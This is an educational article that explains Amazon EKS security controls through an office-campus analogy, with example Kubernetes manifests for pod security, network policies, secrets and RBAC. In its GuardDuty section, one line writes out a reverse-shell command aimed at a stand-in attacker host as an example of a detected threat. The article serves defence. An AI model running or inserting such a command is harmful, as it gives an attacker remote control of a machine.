# EKS Security - The Corporate Security System

> Understanding EKS security through Pod Security Standards, Network Policies, Secrets Management, RBAC, Image Scanning, and Runtime Monitoring - continuing the office campus analogy.

---

## TL;DR

| EKS Security Concept | Office Campus Analogy |
|---------------------|----------------------|
| Pod Security Standards (PSS) | Employee security clearance levels |
| Privileged level | Executive clearance (access everywhere) |
| Baseline level | Regular employee (standard areas only) |
| Restricted level | Intern/Visitor (limited areas, escorted) |
| Network Policies | Department door access controls |
| Kubernetes Secrets | Desk drawer with simple lock |
| AWS Secrets Manager + CSI | Central vault room with auto-rotating codes |
| Role (RBAC) | Job title permissions within a department |
| ClusterRole (RBAC) | Company-wide permissions across all departments |
| RoleBinding | Programming someone's access card |
| ECR Push-time Scanning | Background check at hiring |
| ECR Continuous Scanning | Periodic re-verification for new issues |
| GuardDuty Runtime Monitoring | Security guards + CCTV cameras |

---

## The Security Challenge

Your office campus (cluster) needs multiple layers of security:

```
┌─────────────────────────────────────────────────────────────┐
│                 OFFICE CAMPUS SECURITY LAYERS               │
│                                                             │
│  🚪 WHO CAN ENTER THE BUILDING?                            │
│     └─► Pod Security Standards (What pods are allowed)     │
│                                                             │
│  🚶 WHERE CAN THEY GO INSIDE?                              │
│     └─► Network Policies (Pod-to-pod communication)        │
│                                                             │
│  📋 WHAT CAN THEY DO?                                      │
│     └─► RBAC (Who can create/delete/view resources)        │
│                                                             │
│  🔐 HOW ARE SECRETS PROTECTED?                             │
│     └─► Secrets Management (Credentials, API keys)         │
│                                                             │
│  👔 ARE NEW HIRES TRUSTWORTHY?                             │
│     └─► Image Scanning (Container vulnerability checks)    │
│                                                             │
│  👁️ IS ANYONE BEHAVING SUSPICIOUSLY?                       │
│     └─► Runtime Monitoring (Threat detection)              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Pod Security Standards (PSS) - Employee Clearance Levels

PSS defines **what pods are allowed to do** - like security clearance levels for employees.

```
┌─────────────────────────────────────────────────────────────┐
│              SECURITY CLEARANCE LEVELS                      │
│                                                             │
│  PRIVILEGED (Executive Clearance)                          │
│  ┌────────────────────────────────────────────────────┐    │
│  │  👔 CEO / System Admin                             │    │
│  │                                                    │    │
│  │  ✅ Access server rooms (hostPath)                │    │
│  │  ✅ Use master keys (privileged containers)       │    │
│  │  ✅ Override security (privilege escalation)      │    │
│  │  ✅ Access any floor (host network/PID)           │    │
│  │                                                    │    │
│  │  Use: Monitoring agents, CNI plugins, node tools  │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  BASELINE (Regular Employee)                               │
│  ┌────────────────────────────────────────────────────┐    │
│  │  👤 Standard Developer / Worker                    │    │
│  │                                                    │    │
│  │  ✅ Access their desk (own container)             │    │
│  │  ✅ Use standard equipment                         │    │
│  │  ❌ No server room access (no hostPath)           │    │
│  │  ❌ No master keys (no privileged)                │    │
│  │  ❌ Can't override security                        │    │
│  │                                                    │    │
│  │  Use: Most application workloads                  │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  RESTRICTED (Intern / Visitor)                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │  🎓 Intern / Contractor                            │    │
│  │                                                    │    │
│  │  ✅ Limited desk area only                        │    │
│  │  ❌ Everything from Baseline, PLUS:               │    │
│  │  ❌ Must be escorted (non-root only)              │    │
│  │  ❌ No write access to shared areas               │    │
│  │  ❌ Strictly monitored                             │    │
│  │                                                    │    │
│  │  Use: Untrusted workloads, multi-tenant clusters  │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### PSS Enforcement Modes

```
┌─────────────────────────────────────────────────────────────┐
│                   ENFORCEMENT MODES                         │
│                                                             │
│  ENFORCE - Security Guard at Door                          │
│  ┌────────────────────────────────────────────────────┐    │
│  │  Pod doesn't meet clearance?                       │    │
│  │  🚫 REJECTED! Pod cannot be created.              │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  WARN - Friendly Reminder                                  │
│  ┌────────────────────────────────────────────────────┐    │
│  │  Pod doesn't meet clearance?                       │    │
│  │  ⚠️ WARNING shown, but pod still created.         │    │
│  │  Good for testing before enforcing.               │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  AUDIT - Silent Logging                                    │
│  ┌────────────────────────────────────────────────────┐    │
│  │  Pod doesn't meet clearance?                       │    │
│  │  📝 Logged silently, pod still created.           │    │
│  │  Good for monitoring existing workloads.          │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Applying PSS to a Namespace

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    # Enforce baseline - reject clearly dangerous pods
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/enforce-version: latest

    # Warn about restricted violations - prepare for tightening
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: latest

    # Audit restricted violations - log for review
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: latest
```

**What happens with a pod using hostPath mount:**
```
  ❌ REJECTED (violates baseline enforce level)
  ⚠️ Warning shown (would also violate restricted)
  📝 Logged in audit (violates restricted rules)
```

> **Pattern**: Enforce at a lower level (baseline), warn/audit at a stricter level (restricted). This lets you gradually tighten security without breaking existing workloads.

---

## Network Policies - Department Door Access

Network Policies control **which pods can talk to which pods** - like access cards for department doors.

```
┌─────────────────────────────────────────────────────────────┐
│                 DEFAULT: OPEN OFFICE                        │
│                                                             │
│  Without Network Policies:                                 │
│  ┌────────────────────────────────────────────────────┐    │
│  │                                                    │    │
│  │   Frontend  ←→  Backend  ←→  Database             │    │
│  │      ↕           ↕            ↕                   │    │
│  │   Anyone can talk to anyone! 🚪 No doors!        │    │
│  │                                                    │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  ⚠️  Security Risk: Compromised frontend can directly     │
│     attack database!                                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘

                          │
                          ▼ Add Network Policy

┌─────────────────────────────────────────────────────────────┐
│               WITH NETWORK POLICIES                         │
│                                                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │                                                    │    │
│  │   Frontend  ──→  Backend  ──→  Database           │    │
│  │      │     🚪       │     🚪      │               │    │
│  │      │   (allowed)  │  (allowed)  │               │    │
│  │      │              │             │               │    │
│  │      └──────────────┼─────────────┘               │    │
│  │                     │                              │    │
│  │   Frontend ──✖──→ Database  (BLOCKED!)            │    │
│  │                                                    │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  ✅ Compromised frontend cannot reach database directly!  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### The "Default Deny" Effect

```
IMPORTANT: Once you create a Network Policy targeting a pod,
that pod becomes "deny by default" for that traffic direction!

┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Before any policy:                                        │
│  Backend pod: "Anyone can connect to me!" (allow all)      │
│                                                             │
│  After creating ingress policy targeting Backend:          │
│  Backend pod: "Only explicitly allowed pods can connect!"  │
│                                                             │
│  ⚠️ If you forget to allow something, it's blocked!       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Network Policy Example

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-policy
  namespace: production
spec:
  # Target: pods with label app=backend
  podSelector:
    matchLabels:
      app: backend
  
  policyTypes:
    - Ingress    # Control incoming traffic
    - Egress     # Control outgoing traffic
  
  # INGRESS: Who can connect TO backend?
  ingress:
    - from:
        # Only pods with app=frontend can connect
        - podSelector:
            matchLabels:
              app: frontend
      ports:
        - protocol: TCP
          port: 8080   # Only on port 8080
  
  # EGRESS: Where can backend connect TO?
  egress:
    - to:
        # Can connect to database pods
        - podSelector:
            matchLabels:
              app: database
      ports:
        - protocol: TCP
          port: 5432   # PostgreSQL port
    - to:
        # Can reach DNS for name resolution
        - namespaceSelector: {}
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
```

### Enabling Network Policies in EKS

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  VPC CNI Network Policy (Native AWS)                       │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • Built into VPC CNI v1.14+                       │    │
│  │  • Enable with: ENABLE_NETWORK_POLICY=true         │    │
│  │  • Uses eBPF for fast enforcement                  │    │
│  │  • EKS Auto Mode: Easy to enable                   │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  Third-party Options                                       │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • Calico: Full-featured, widely used              │    │
│  │  • Cilium: eBPF-based, advanced features           │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Secrets Management - Desk Drawer vs Vault Room

### Kubernetes Secrets - The Desk Drawer

```
┌─────────────────────────────────────────────────────────────┐
│           KUBERNETES SECRETS (Desk Drawer)                  │
│                                                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │                                                    │    │
│  │   👤 Developer's Desk                              │    │
│  │   ┌──────────────────────────────────────────┐    │    │
│  │   │  🗄️ Drawer with simple lock              │    │    │
│  │   │                                          │    │    │
│  │   │  📄 password=admin123  (base64 encoded)  │    │    │
│  │   │  📄 api_key=xyz789    (base64 encoded)   │    │    │
│  │   │                                          │    │    │
│  │   │  ⚠️ Anyone with drawer key can read!    │    │    │
│  │   │  ⚠️ base64 ≠ encryption!                │    │    │
│  │   └──────────────────────────────────────────┘    │    │
│  │                                                    │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  Problems:                                                  │
│  ❌ base64 is just encoding (easily decoded)               │
│  ❌ Stored in etcd (cluster access = secret access)        │
│  ❌ Manual rotation (you update, you redeploy)             │
│  ❌ Secrets in Git if not careful (yaml files)             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

```yaml
# Basic Kubernetes Secret
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  # base64 encoded - NOT encrypted!
  username: YWRtaW4=        # echo -n "admin" | base64
  password: c2VjcmV0MTIz    # echo -n "secret123" | base64
```

```bash
# Anyone with cluster access can decode:
$ echo "c2VjcmV0MTIz" | base64 -d
secret123    # 😱 That easy!
```

### AWS Secrets Manager + CSI Driver - The Vault Room

```
┌─────────────────────────────────────────────────────────────┐
│        AWS SECRETS MANAGER + CSI (Vault Room)              │
│                                                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │                                                    │    │
│  │   🏦 Central Vault Room (AWS Secrets Manager)      │    │
│  │   ┌──────────────────────────────────────────┐    │    │
│  │   │  🔐 Encrypted vault (KMS encryption)     │    │    │
│  │   │  🔄 Auto-rotating codes (rotation)       │    │    │
│  │   │  📝 Full audit trail (CloudTrail)        │    │    │
│  │   │  🎫 Badge required (IAM + Pod Identity)  │    │    │
│  │   │                                          │    │    │
│  │   │  Secret: db-password → [encrypted]       │    │    │
│  │   └──────────────────────────────────────────┘    │    │
│  │                        │                          │    │
│  │                        │ CSI Driver               │    │
│  │                        ▼                          │    │
│  │   ┌──────────────────────────────────────────┐   │    │
│  │   │  Pod                                     │   │    │
│  │   │  📁 /mnt/secrets/db-password → "secret"  │   │    │
│  │   │                                          │   │    │
│  │   │  Secret mounted as file, never stored    │   │    │
│  │   │  in Kubernetes! ✅                       │   │    │
│  │   └──────────────────────────────────────────┘   │    │
│  │                                                    │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  Benefits:                                                  │
│  ✅ Encrypted at rest with KMS                             │
│  ✅ Auto-rotation (no manual updates!)                     │
│  ✅ Never stored in etcd                                   │
│  ✅ Full audit trail in CloudTrail                         │
│  ✅ Fine-grained IAM permissions                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### How It Works

```
┌─────────────────────────────────────────────────────────────┐
│                  SECRETS CSI DRIVER FLOW                    │
│                                                             │
│  1. Pod has ServiceAccount with Pod Identity               │
│                        │                                    │
│                        ▼                                    │
│  2. Pod requests secret via CSI volume                     │
│                        │                                    │
│                        ▼                                    │
│  3. CSI driver uses Pod Identity to call AWS               │
│                        │                                    │
│                        ▼                                    │
│  4. AWS Secrets Manager returns secret                     │
│     (if IAM allows it)                                     │
│                        │                                    │
│                        ▼                                    │
│  5. Secret mounted as file in pod                          │
│     /mnt/secrets/my-secret → actual secret value           │
│                                                             │
│  Secret never touches etcd! 🔒                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

```yaml
# SecretProviderClass - tells CSI where to get secrets
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: aws-secrets
spec:
  provider: aws
  parameters:
    objects: |
      - objectName: "prod/db-password"
        objectType: "secretsmanager"
---
# Pod using the secret
apiVersion: v1
kind: Pod
metadata:
  name: my-app
spec:
  serviceAccountName: my-app-sa  # Has Pod Identity!
  containers:
    - name: app
      image: my-app:latest
      volumeMounts:
        - name: secrets
          mountPath: /mnt/secrets
          readOnly: true
  volumes:
    - name: secrets
      csi:
        driver: secrets-store.csi.k8s.io
        readOnly: true
        volumeAttributes:
          secretProviderClass: aws-secrets
```

---

## RBAC - Job Title Permissions

RBAC (Role-Based Access Control) defines **who can do what** - like job titles determining what you can access.

```
┌─────────────────────────────────────────────────────────────┐
│                   RBAC COMPONENTS                           │
│                                                             │
│  WHAT permissions exist?        WHO gets them?              │
│  ┌─────────────────────┐       ┌─────────────────────┐     │
│  │   Role/ClusterRole  │       │ RoleBinding/        │     │
│  │                     │ ───── │ ClusterRoleBinding  │     │
│  │   • get pods        │       │                     │     │
│  │   • list secrets    │       │ User: john          │     │
│  │   • create deploys  │       │ Group: developers   │     │
│  └─────────────────────┘       └─────────────────────┘     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Role vs ClusterRole

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  ROLE (Department Manager)                                 │
│  ┌────────────────────────────────────────────────────┐    │
│  │                                                    │    │
│  │  📍 Namespaced: Only works in ONE namespace       │    │
│  │                                                    │    │
│  │  Example: "dev-manager" role in "dev" namespace   │    │
│  │  • Can view pods in dev namespace ✅              │    │
│  │  • Can view pods in prod namespace ❌             │    │
│  │                                                    │    │
│  │  Use: Department-specific permissions             │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  CLUSTERROLE (Company Executive)                           │
│  ┌────────────────────────────────────────────────────┐    │
│  │                                                    │    │
│  │  🌐 Cluster-wide: Works across ALL namespaces     │    │
│  │                                                    │    │
│  │  Example: "cluster-admin" ClusterRole             │    │
│  │  • Can view pods in dev namespace ✅              │    │
│  │  • Can view pods in prod namespace ✅             │    │
│  │  • Can view nodes (cluster-scoped) ✅             │    │
│  │                                                    │    │
│  │  Use: Cluster-wide permissions, cluster resources │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### RBAC Example - Read-Only Developer in Dev Namespace

```yaml
# Role: What permissions exist
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
  namespace: dev           # Only applies to "dev" namespace
rules:
  - apiGroups: [""]        # Core API group
    resources: ["pods", "pods/log"]
    verbs: ["get", "list", "watch"]  # Read-only actions
  - apiGroups: [""]
    resources: ["services"]
    verbs: ["get", "list"]
---
# RoleBinding: Who gets the permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: john-pod-reader
  namespace: dev
subjects:
  - kind: User
    name: john              # The developer
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: pod-reader          # The role above
  apiGroup: rbac.authorization.k8s.io
```

```
Result:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  John in DEV namespace:                                    │
│  ✅ kubectl get pods          (allowed)                    │
│  ✅ kubectl logs my-pod       (allowed)                    │
│  ❌ kubectl delete pod my-pod (denied - no delete verb)   │
│                                                             │
│  John in PROD namespace:                                   │
│  ❌ kubectl get pods          (denied - different ns)     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Common RBAC Verbs

| Verb | Action | Example |
|------|--------|---------|
| `get` | Read single resource | `kubectl get pod my-pod` |
| `list` | Read multiple resources | `kubectl get pods` |
| `watch` | Stream changes | `kubectl get pods -w` |
| `create` | Create new resources | `kubectl apply -f pod.yaml` |
| `update` | Modify resources | `kubectl edit pod` |
| `patch` | Partial update | `kubectl patch pod` |
| `delete` | Remove resources | `kubectl delete pod` |

---

## Image Security - Background Checks

### ECR Image Scanning

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  PUSH-TIME SCANNING (Background Check at Hiring)           │
│  ┌────────────────────────────────────────────────────┐    │
│  │                                                    │    │
│  │  Developer pushes image                           │    │
│  │         │                                          │    │
│  │         ▼                                          │    │
│  │  ECR scans against known CVEs                     │    │
│  │         │                                          │    │
│  │         ▼                                          │    │
│  │  ┌────────────────────────────────────────┐       │    │
│  │  │ CVE-2023-1234: HIGH (OpenSSL vuln)    │       │    │
│  │  │ CVE-2023-5678: MEDIUM (curl bug)      │       │    │
│  │  └────────────────────────────────────────┘       │    │
│  │                                                    │    │
│  │  ✅ Good: Catch issues before deployment          │    │
│  │  ⚠️ Limitation: New CVEs discovered later?       │    │
│  │                                                    │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  CONTINUOUS SCANNING (Periodic Re-verification)            │
│  ┌────────────────────────────────────────────────────┐    │
│  │                                                    │    │
│  │  Image pushed 3 months ago                        │    │
│  │  At push: 0 vulnerabilities ✅                    │    │
│  │                                                    │    │
│  │  Today: New CVE discovered!                       │    │
│  │         │                                          │    │
│  │         ▼                                          │    │
│  │  ECR re-scans existing images automatically       │    │
│  │         │                                          │    │
│  │         ▼                                          │    │
│  │  ┌────────────────────────────────────────┐       │    │
│  │  │ CVE-2024-9999: CRITICAL (new finding!)│       │    │
│  │  └────────────────────────────────────────┘       │    │
│  │                                                    │    │
│  │  ✅ Catches new vulnerabilities in old images!   │    │
│  │  📧 Send alerts via EventBridge → SNS            │    │
│  │                                                    │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Image Scanning Best Practices

```
┌─────────────────────────────────────────────────────────────┐
│              IMAGE SECURITY LAYERS                          │
│                                                             │
│  1. Scan at Build (CI/CD)                                  │
│     └─► Trivy, Snyk, etc. in pipeline                     │
│                                                             │
│  2. Scan at Push (ECR)                                     │
│     └─► Enable scan-on-push                                │
│                                                             │
│  3. Continuous Scan (ECR Enhanced)                         │
│     └─► Re-scan as new CVEs discovered                     │
│                                                             │
│  4. Admission Control (OPA/Kyverno)                        │
│     └─► Block deployment if critical CVEs found            │
│                                                             │
│  5. Runtime Monitoring (GuardDuty)                         │
│     └─► Detect exploitation of vulnerabilities             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Runtime Security - Security Guards + CCTV

### Amazon GuardDuty EKS Runtime Monitoring

```
┌─────────────────────────────────────────────────────────────┐
│         GUARDDUTY (Security Guards + CCTV)                  │
│                                                             │
│  ┌────────────────────────────────────────────────────┐    │
│  │                                                    │    │
│  │   👁️ 24/7 Surveillance System                     │    │
│  │                                                    │    │
│  │   Watching for suspicious behavior:               │    │
│  │                                                    │    │
│  │   🚨 Container Escape Attempt                     │    │
│  │   ┌──────────────────────────────────────────┐   │    │
│  │   │ Pod trying to break out of container!    │   │    │
│  │   │ → Mounting /etc/shadow from host         │   │    │
│  │   └──────────────────────────────────────────┘   │    │
│  │                                                    │    │
│  │   🚨 Privilege Escalation                         │    │
│  │   ┌──────────────────────────────────────────┐   │    │
│  │   │ Container trying to become root!         │   │    │
│  │   │ → Using kernel exploit                   │   │    │
│  │   └──────────────────────────────────────────┘   │    │
│  │                                                    │    │
│  │   🚨 Suspicious Commands                          │    │
│  │   ┌──────────────────────────────────────────┐   │    │
│  │   │ Someone running reverse shell!           │   │    │
│  │   │ → bash -i >& /dev/tcp/evil.com/443       │   │    │
│  │   └──────────────────────────────────────────┘   │    │
│  │                                                    │    │
│  │   🚨 Cryptocurrency Mining                        │    │
│  │   ┌──────────────────────────────────────────┐   │    │
│  │   │ Pod secretly mining bitcoin!             │   │    │
│  │   │ → xmrig process detected                 │   │    │
│  │   └──────────────────────────────────────────┘   │    │
│  │                                                    │    │
│  │   🚨 Malicious IP Communication                   │    │
│  │   ┌──────────────────────────────────────────┐   │    │
│  │   │ Pod calling known bad IP!                │   │    │
│  │   │ → Connection to botnet C2 server         │   │    │
│  │   └──────────────────────────────────────────┘   │    │
│  │                                                    │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  How it works:                                             │
│  • GuardDuty agent runs on each node                       │
│  • Monitors syscalls, network, file access                 │
│  • Uses ML to detect anomalies                             │
│  • Alerts via SecurityHub, EventBridge                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Complete Security Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                 EKS SECURITY LAYERS                             │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                    PERIMETER                            │   │
│  │  • VPC (isolated network)                               │   │
│  │  • Security Groups (firewall)                           │   │
│  │  • Private subnets (no direct internet)                 │   │
│  └─────────────────────────────────────────────────────────┘   │
│                          │                                      │
│                          ▼                                      │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                 CLUSTER ACCESS                          │   │
│  │  • EKS IAM Authentication (who can call API)            │   │
│  │  • RBAC (what they can do)                              │   │
│  │  • Audit Logging (track all actions)                    │   │
│  └─────────────────────────────────────────────────────────┘   │
│                          │                                      │
│                          ▼                                      │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                 POD ADMISSION                           │   │
│  │  • Pod Security Standards (what pods can do)            │   │
│  │  • Image Scanning (vulnerability checks)                │   │
│  │  • Admission Controllers (policy enforcement)           │   │
│  └─────────────────────────────────────────────────────────┘   │
│                          │                                      │
│                          ▼                                      │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                 POD RUNTIME                             │   │
│  │  • Network Policies (pod-to-pod traffic)                │   │
│  │  • Secrets Management (credentials)                     │   │
│  │  • Pod Identity (AWS access)                            │   │
│  └─────────────────────────────────────────────────────────┘   │
│                          │                                      │
│                          ▼                                      │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                 MONITORING                              │   │
│  │  • GuardDuty (threat detection)                         │   │
│  │  • CloudTrail (API audit)                               │   │
│  │  • Container Insights (metrics/logs)                    │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Quick Reference

| Security Layer | Component | Purpose |
|---------------|-----------|---------|
| **Pod Security** | PSS (Privileged/Baseline/Restricted) | What pods can do |
| **Network Security** | Network Policies | Pod-to-pod traffic control |
| **Secrets** | K8s Secrets | Simple, base64 encoded |
| **Secrets** | AWS Secrets Manager + CSI | Encrypted, auto-rotating |
| **Access Control** | RBAC (Role/ClusterRole) | Who can do what |
| **Image Security** | ECR Scanning | Vulnerability detection |
| **Runtime Security** | GuardDuty | Threat detection |

---

## Common Pitfalls

| Problem | Solution |
|---------|----------|
| **All pods privileged** | Start with Baseline PSS, move to Restricted |
| **No network policies** | Start with deny-all, allow explicitly |
| **Secrets in Git** | Use External Secrets Operator, never commit secrets |
| **Overly permissive RBAC** | Follow least-privilege, use Roles not ClusterRoles |
| **No image scanning** | Enable ECR continuous scanning + admission control |
| **No runtime monitoring** | Enable GuardDuty EKS Runtime Monitoring |

---

## Key Takeaways

1. **PSS = Clearance levels** - Privileged (executive), Baseline (employee), Restricted (intern)
2. **Network Policies = Door access** - Default allow-all → explicit allow after policy
3. **K8s Secrets = Desk drawer** - Simple lock, base64 encoded, manual rotation
4. **Secrets Manager + CSI = Vault room** - Encrypted, auto-rotating, never in etcd
5. **RBAC = Job permissions** - Role (namespaced) vs ClusterRole (cluster-wide)
6. **ECR Scanning = Background checks** - Push-time + continuous scanning
7. **GuardDuty = Security guards** - Detects threats at runtime

---

## Related Reading

- [AWS VPC - The Compound Analogy](../november/2025-11-30-aws-vpc.md)
- [AWS EKS - The Managed Office Building Analogy](./2025-12-02-aws-eks.md)
- [AWS VPC CNI - The Phone Extension System](./2025-12-03-aws-vpc-cni.md)
- [EKS Networking - The Mail & Delivery System](./2025-12-09-eks-networking.md)
- [EKS IAM - The Employee Badge System](./2025-12-10-eks-iam-irsa-pod-identity.md)
- [EKS Storage - The Locker & Storage Room System](./2025-12-11-eks-storage.md)
- [EKS Autoscaling - The Staffing & Workspace Management](./2025-12-12-eks-autoscaling.md)

---

*Written on December 14, 2025*
